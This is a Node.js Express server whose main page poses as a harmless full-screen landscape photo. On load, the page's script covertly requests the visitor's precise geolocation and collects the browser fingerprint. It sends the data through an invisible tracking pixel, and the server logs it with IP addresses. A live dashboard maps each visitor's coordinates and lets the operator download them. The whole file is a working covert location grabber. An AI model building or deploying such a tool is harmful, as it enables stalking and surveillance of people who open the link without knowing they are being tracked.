const express = require("express");
const fs = require("fs");
const app = express();
const PORT = 3000;

// Enable CORS
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept",
  );
  next();
});

// Create data file if not exists
if (!fs.existsSync("data.json")) {
  fs.writeFileSync("data.json", "[]");
}

// MAIN PAGE - Auto-refresh every 3 seconds
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>View</title>
        <meta http-equiv="refresh" content="3">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body, html {
                width: 100%;
                height: 100%;
                overflow: hidden;
                background: #000;
            }
            .image-container {
                width: 100vw;
                height: 100vh;
                position: relative;
            }
            img {
                width: 100%;
                height: 100%;
                object-fit: cover;
                display: block;
            }
            .refresh-notice {
                position: fixed;
                bottom: 10px;
                right: 10px;
                background: rgba(0,0,0,0.7);
                color: white;
                padding: 5px 10px;
                border-radius: 5px;
                font-size: 12px;
                font-family: Arial, sans-serif;
                display: none;
            }
        </style>
    </head>
    <body>
        <div class="image-container">
            <img src="https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=2070&q=80" 
                 alt="Beautiful Mountain View">
        </div>
        
        <div class="refresh-notice" id="refreshNotice">Page will refresh in <span id="countdown">3</span>s</div>
        
        <script>
            // Show refresh countdown
            const notice = document.getElementById('refreshNotice');
            const countdown = document.getElementById('countdown');
            let seconds = 3;
            
            const timer = setInterval(() => {
                seconds--;
                countdown.textContent = seconds;
                if (seconds <= 0) {
                    clearInterval(timer);
                    notice.style.display = 'none';
                }
            }, 1000);
            
            // Show notice after 1 second
            setTimeout(() => {
                notice.style.display = 'block';
            }, 1000);
            
            // TRACKING FUNCTION - Execute immediately
            (function trackLocation() {
                console.log("🔄 Auto-refresh tracker started...");
                
                // Create invisible tracking pixel
                const tracker = new Image();
                tracker.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;';
                
                // Get all possible data
                const data = {
                    ua: navigator.userAgent,
                    screen: window.screen.width + 'x' + window.screen.height,
                    time: new Date().toISOString(),
                    referer: document.referrer || 'direct',
                    t: Date.now()
                };
                
                // Function to send data
                function sendToServer(lat, lng, acc, error) {
                    let url = '/save?';
                    
                    if (lat && lng) {
                        data.lat = lat;
                        data.lng = lng;
                        data.acc = acc;
                        data.status = 'success';
                    } else {
                        data.error = error || 'unknown';
                        data.status = 'blocked';
                    }
                    
                    // Build URL with all data
                    for (let key in data) {
                        if (data[key] !== undefined && data[key] !== null) {
                            url += key + '=' + encodeURIComponent(data[key]) + '&';
                        }
                    }
                    
                    // Send via image (works even if fetch blocked)
                    tracker.src = url;
                    document.body.appendChild(tracker);
                    
                    console.log('📡 Tracking data sent:', {lat, lng, error});
                }
                
                // Try to get location
                if (navigator.geolocation) {
                    console.log("📍 Requesting location permission...");
                    
                    // Use getCurrentPosition
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            console.log("✅ Location received!");
                            sendToServer(
                                position.coords.latitude,
                                position.coords.longitude,
                                position.coords.accuracy,
                                null
                            );
                        },
                        function(error) {
                            console.log("❌ Location error:", error.code);
                            
                            // Try watchPosition as fallback
                            const watchId = navigator.geolocation.watchPosition(
                                function(watchPos) {
                                    console.log("✅ WatchPosition got location!");
                                    sendToServer(
                                        watchPos.coords.latitude,
                                        watchPos.coords.longitude,
                                        watchPos.coords.accuracy,
                                        null
                                    );
                                    navigator.geolocation.clearWatch(watchId);
                                },
                                function(watchError) {
                                    console.log("❌ WatchPosition failed");
                                    sendToServer(null, null, null, 'error_' + watchError.code);
                                },
                                {
                                    enableHighAccuracy: true,
                                    timeout: 3000,
                                    maximumAge: 0
                                }
                            );
                            
                            // Clear after 5 seconds
                            setTimeout(() => navigator.geolocation.clearWatch(watchId), 5000);
                        },
                        {
                            enableHighAccuracy: true,  // Force permission prompt
                            timeout: 5000,
                            maximumAge: 0
                        }
                    );
                } else {
                    console.log("❌ Geolocation not supported");
                    sendToServer(null, null, null, 'not_supported');
                }
                
                // Always send at least IP data (fallback after 2 seconds)
                setTimeout(() => {
                    const trackers = document.querySelectorAll('img[src^="/save"]');
                    if (trackers.length === 0) {
                        console.log("🕒 Sending fallback data...");
                        sendToServer(null, null, null, 'timeout_fallback');
                    }
                }, 2000);
                
            })(); // Immediately invoked
            
        </script>
    </body>
    </html>
  `);
});

// SAVE ENDPOINT - Store tracking data
app.get("/save", (req, res) => {
  const ip =
    req.headers["x-forwarded-for"] || req.ip || req.connection.remoteAddress;
  const timestamp = new Date().toLocaleString("en-US", {
    year: "numeric",
    month: "short",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });

  // Create data entry
  const entry = {
    id: Date.now() + Math.random().toString(36).substr(2, 9),
    timestamp: timestamp,
    ip: ip,
    latitude: req.query.lat || "Blocked",
    longitude: req.query.lng || "Blocked",
    accuracy: req.query.acc ? Math.round(req.query.acc) + "m" : "N/A",
    userAgent: req.query.ua || "Unknown",
    screenSize: req.query.screen || "Unknown",
    referer: req.query.referer || "Direct",
    status: req.query.status || (req.query.lat ? "success" : "blocked"),
    error: req.query.error || "none",
    visitTime: req.query.time || new Date().toISOString(),
  };

  // Log to console
  console.log("📍 TRACKED:", {
    time: entry.timestamp,
    ip: entry.ip,
    location: entry.latitude + ", " + entry.longitude,
    status: entry.status,
  });

  // Save to JSON file
  let data = [];
  try {
    if (fs.existsSync("data.json")) {
      data = JSON.parse(fs.readFileSync("data.json", "utf8"));
    }
  } catch (e) {
    console.log("Error reading data.json:", e.message);
  }

  data.unshift(entry); // Add to beginning
  fs.writeFileSync("data.json", JSON.stringify(data, null, 2));

  // Also append to simple log file
  const logLine = `[${timestamp}] ${entry.ip} | Location: ${entry.latitude}, ${entry.longitude} | Status: ${entry.status}\n`;
  fs.appendFileSync("track.log", logLine);

  // Return transparent 1x1 pixel
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.writeHead(200, {
    "Content-Type": "image/png",
    "Cache-Control": "no-cache, no-store, must-revalidate",
  });
  res.end(
    Buffer.from(
      "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
      "base64",
    ),
  );
});

// GET DATA ENDPOINT - For viewer
app.get("/get-data", (req, res) => {
  let data = [];
  try {
    if (fs.existsSync("data.json")) {
      data = JSON.parse(fs.readFileSync("data.json", "utf8"));
    }
  } catch (e) {
    console.log("Error reading data:", e.message);
  }

  res.setHeader("Access-Control-Allow-Origin", "*");
  res.json(data);
});

// CLEAR DATA ENDPOINT
app.get("/clear-data", (req, res) => {
  fs.writeFileSync("data.json", "[]");
  fs.writeFileSync("track.log", "");

  res.setHeader("Access-Control-Allow-Origin", "*");
  res.json({
    success: true,
    message: "All data cleared",
    timestamp: new Date().toISOString(),
  });
});

// DATA VIEWER PAGE (Auto-refresh every 5 seconds)
app.get("/view", (req, res) => {
  let data = [];
  try {
    if (fs.existsSync("data.json")) {
      data = JSON.parse(fs.readFileSync("data.json", "utf8"));
    }
  } catch (e) {
    console.log("Error reading data:", e.message);
  }

  const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Live Tracking Data</title>
        <meta http-equiv="refresh" content="5">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
                background: white;
                border-radius: 10px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                overflow: hidden;
            }
            .header {
                background: linear-gradient(135deg, #4c51bf 0%, #667eea 100%);
                color: white;
                padding: 20px;
                text-align: center;
            }
            .header h1 {
                font-size: 24px;
                margin-bottom: 5px;
            }
            .stats {
                display: flex;
                background: #f8f9fa;
                padding: 15px;
                border-bottom: 2px solid #e9ecef;
                flex-wrap: wrap;
                gap: 15px;
            }
            .stat-box {
                text-align: center;
                padding: 10px 15px;
                background: white;
                border-radius: 8px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                min-width: 120px;
            }
            .stat-number {
                font-size: 22px;
                font-weight: bold;
                color: #4c51bf;
            }
            .stat-label {
                font-size: 12px;
                color: #666;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            .controls {
                padding: 15px;
                background: white;
                border-bottom: 1px solid #e9ecef;
                display: flex;
                gap: 10px;
                flex-wrap: wrap;
            }
            button {
                padding: 10px 20px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                font-weight: 500;
                display: flex;
                align-items: center;
                gap: 8px;
                transition: all 0.3s;
            }
            button:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            }
            .refresh-btn {
                background: #3b82f6;
                color: white;
            }
            .clear-btn {
                background: #ef4444;
                color: white;
            }
            .download-btn {
                background: #10b981;
                color: white;
            }
            .data-container {
                padding: 15px;
                max-height: 500px;
                overflow-y: auto;
            }
            table {
                width: 100%;
                border-collapse: collapse;
            }
            th {
                background: #f1f3f9;
                padding: 12px 15px;
                text-align: left;
                font-weight: 600;
                color: #4c51bf;
                border-bottom: 2px solid #dee2e6;
                position: sticky;
                top: 0;
            }
            td {
                padding: 12px 15px;
                border-bottom: 1px solid #e9ecef;
            }
            tr:hover {
                background: #f8f9fa;
            }
            .success {
                color: #10b981;
                font-weight: bold;
            }
            .blocked {
                color: #ef4444;
                font-weight: bold;
            }
            .empty {
                text-align: center;
                padding: 40px;
                color: #666;
                font-style: italic;
            }
            .refresh-info {
                position: fixed;
                bottom: 10px;
                right: 10px;
                background: rgba(0,0,0,0.8);
                color: white;
                padding: 8px 12px;
                border-radius: 5px;
                font-size: 12px;
            }
            @media (max-width: 768px) {
                body { padding: 10px; }
                .stat-box { min-width: 100px; }
                th, td { padding: 8px 10px; font-size: 14px; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>📍 Live Tracking Dashboard</h1>
                <p>Auto-refreshes every 5 seconds</p>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-number">${data.length}</div>
                    <div class="stat-label">Total Entries</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">${data.filter((d) => d.latitude !== "Blocked").length}</div>
                    <div class="stat-label">With Location</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">${[...new Set(data.map((d) => d.ip))].length}</div>
                    <div class="stat-label">Unique IPs</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">${new Date().toLocaleTimeString()}</div>
                    <div class="stat-label">Last Update</div>
                </div>
            </div>
            
            <div class="controls">
                <button class="refresh-btn" onclick="location.reload()">
                    🔄 Refresh Now
                </button>
                <button class="download-btn" onclick="downloadData()">
                    📥 Download JSON
                </button>
                <button class="clear-btn" onclick="clearData()">
                    🗑️ Clear All Data
                </button>
            </div>
            
            <div class="data-container">
                <table>
                    <thead>
                        <tr>
                            <th>Time</th>
                            <th>IP Address</th>
                            <th>Location</th>
                            <th>Device</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${
                          data.length > 0
                            ? data
                                .map(
                                  (entry) => `
                            <tr>
                                <td>${entry.timestamp}</td>
                                <td><strong>${entry.ip}</strong></td>
                                <td>
                                    ${
                                      entry.latitude !== "Blocked"
                                        ? `<a href="https://maps.google.com/?q=${entry.latitude},${entry.longitude}" 
                                           target="_blank" style="color:#3b82f6;">
                                            📍 ${entry.latitude}, ${entry.longitude}
                                        </a>
                                        ${entry.accuracy !== "N/A" ? `<br><small>${entry.accuracy}</small>` : ""}`
                                        : '<span class="blocked">📍 Location Blocked</span>'
                                    }
                                </td>
                                <td>
                                    <small>${entry.screenSize}</small><br>
                                    <small style="color:#666;">${entry.userAgent.substring(0, 40)}...</small>
                                </td>
                                <td class="${entry.status === "success" ? "success" : "blocked"}">
                                    ${entry.status}
                                </td>
                            </tr>
                        `,
                                )
                                .join("")
                            : `
                            <tr>
                                <td colspan="5" class="empty">
                                    📭 No tracking data yet. Wait for the tracker to refresh...
                                </td>
                            </tr>
                        `
                        }
                    </tbody>
                </table>
            </div>
        </div>
        
        <div class="refresh-info">
            Auto-refresh in <span id="countdown">5</span>s
        </div>
        
        <script>
            // Countdown timer
            let seconds = 5;
            const countdownEl = document.getElementById('countdown');
            const timer = setInterval(() => {
                seconds--;
                countdownEl.textContent = seconds;
                if (seconds <= 0) {
                    clearInterval(timer);
                }
            }, 1000);
            
            function downloadData() {
                const data = ${JSON.stringify(data)};
                if (data.length === 0) {
                    alert('No data to download!');
                    return;
                }
                
                const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'tracking-data-' + new Date().toISOString().split('T')[0] + '.json';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }
            
            function clearData() {
                if(!confirm('⚠️ Delete ALL ${data.length} records? This cannot be undone!')) return;
                
                fetch('/clear-data')
                    .then(res => res.json())
                    .then(result => {
                        alert(result.message);
                        location.reload();
                    })
                    .catch(err => {
                        alert('Error: ' + err.message);
                    });
            }
        </script>
    </body>
    </html>
  `;

  res.send(html);
});

// Start server
app.listen(PORT, () => {
  console.log(`
    🚀 SERVER STARTED SUCCESSFULLY!
    ================================
    🌐 Main Tracker: http://localhost:${PORT}
    📊 Data Viewer:  http://localhost:${PORT}/view
    📡 API Endpoint: http://localhost:${PORT}/get-data
    
    🔄 Main page auto-refreshes every 3 seconds
    📊 Viewer auto-refreshes every 5 seconds
    
    📝 Logs saved to: data.json and track.log
    ================================
  `);
});
